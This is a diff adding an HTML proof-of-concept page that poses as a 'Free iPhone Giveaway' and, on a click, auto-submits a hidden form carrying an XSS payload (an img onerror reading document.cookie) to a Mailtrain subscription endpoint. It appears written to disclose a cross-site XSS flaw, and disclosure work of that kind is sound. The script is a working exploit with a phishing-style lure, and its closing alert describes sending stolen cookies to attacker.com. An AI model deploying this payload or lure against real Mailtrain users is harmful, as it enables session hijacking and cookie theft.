@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone Giveaway!</title>
+    <style>
+        body {
+            font-family: Arial;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .prize-box {
+            background: white;
+            color: #333;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 { color: #667eea; margin-top: 0; }
+        button {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover { background: #218838; }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 5px;
+            display: none;
+        }
+        pre {
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: left;
+            font-size: 12px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="prize-box">
+        <h1>🎉 Congratulations!</h1>
+        <p><strong>You've won a FREE iPhone 15 Pro!</strong></p>
+        <p>Click below to claim your prize:</p>
+        
+        <button onclick="claimPrize()">🎁 Claim My Prize!</button>
+        
+        <div id="status" class="status"></div>
+        
+        <hr style="margin: 30px 0;">
+        
+        <h3 style="color: #dc3545;">⚠️ Security Demonstration</h3>
+        <p style="font-size: 14px;">This demonstrates a real XSS attack scenario</p>
+        <button onclick="showTechnical()" style="background: #6c757d;">Show Technical Details</button>
+        
+        <div id="technical" style="display:none; margin-top:20px; text-align:left;">
+            <h4>Attack Flow:</h4>
+            <ol style="font-size: 14px;">
+                <li>Victim visits this malicious page</li>
+                <li>Clicks "Claim Prize" button</li>
+                <li>JavaScript sends XSS payload to Mailtrain</li>
+                <li>Mailtrain returns error with unescaped HTML</li>
+                <li>Victim (if logged into Mailtrain) gets XSSed</li>
+                <li>Attacker steals session/cookies</li>
+            </ol>
+            
+            <h4>Payload:</h4>
+            <pre id="payload-display"></pre>
+            
+            <h4>Why This Isn't Self-XSS:</h4>
+            <ul style="font-size: 14px;">
+                <li>✓ Attacker controls this page (different domain)</li>
+                <li>✓ Victim just clicks a button</li>
+                <li>✓ Payload sent from attacker's page</li>
+                <li>✓ XSS executes in Mailtrain's context</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        function showTechnical() {
+            var tech = document.getElementById('technical');
+            tech.style.display = tech.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        function claimPrize() {
+            var status = document.getElementById('status');
+            status.style.display = 'block';
+            status.style.background = '#fff3cd';
+            status.style.borderColor = '#ffc107';
+            status.innerHTML = '⏳ Processing your entry...';
+            
+            // XSS payload - steals cookies
+            var xssPayload = 'winner<img src=x onerror=alert("🔴 XSS FROM ATTACKER SITE!\\n\\nOrigin: ' + window.location.origin + '\\n\\nVictim Cookie: "+document.cookie)>@attacker.com';
+            
+            document.getElementById('payload-display').textContent = xssPayload;
+            
+            // Send payload to victim's Mailtrain instance
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:3000/subscription/_WDIYeIl_/subscribe';
+            form.target = '_blank'; // Open in new tab to show the XSS
+            
+            var email = document.createElement('input');
+            email.type = 'hidden';
+            email.name = 'email';
+            email.value = xssPayload;
+            form.appendChild(email);
+            
+            var sub = document.createElement('input');
+            sub.type = 'hidden';
+            sub.name = 'sub';
+            sub.value = Date.now();
+            form.appendChild(sub);
+            
+            document.body.appendChild(form);
+            form.submit();
+            
+            setTimeout(function() {
+                status.style.background = '#d4edda';
+                status.style.borderColor = '#c3e6cb';
+                status.innerHTML = '✓ Entry submitted!<br><small>Check the opened tab for the XSS execution</small>';
+            }, 1000);
+            
+            setTimeout(function() {
+                alert('🔴 ATTACK DEMONSTRATION\n\n' +
+                      'What just happened:\n' +
+                      '1. You (victim) clicked "Claim Prize"\n' +
+                      '2. Attacker\'s page submitted XSS payload\n' +
+                      '3. New tab opened showing Mailtrain error\n' +
+                      '4. XSS should execute in that tab\n\n' +
+                      'In real attack:\n' +
+                      '- Victim\'s cookies would be stolen\n' +
+                      '- Sent to: http://attacker.com/steal\n' +
+                      '- Session hijacked!');
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
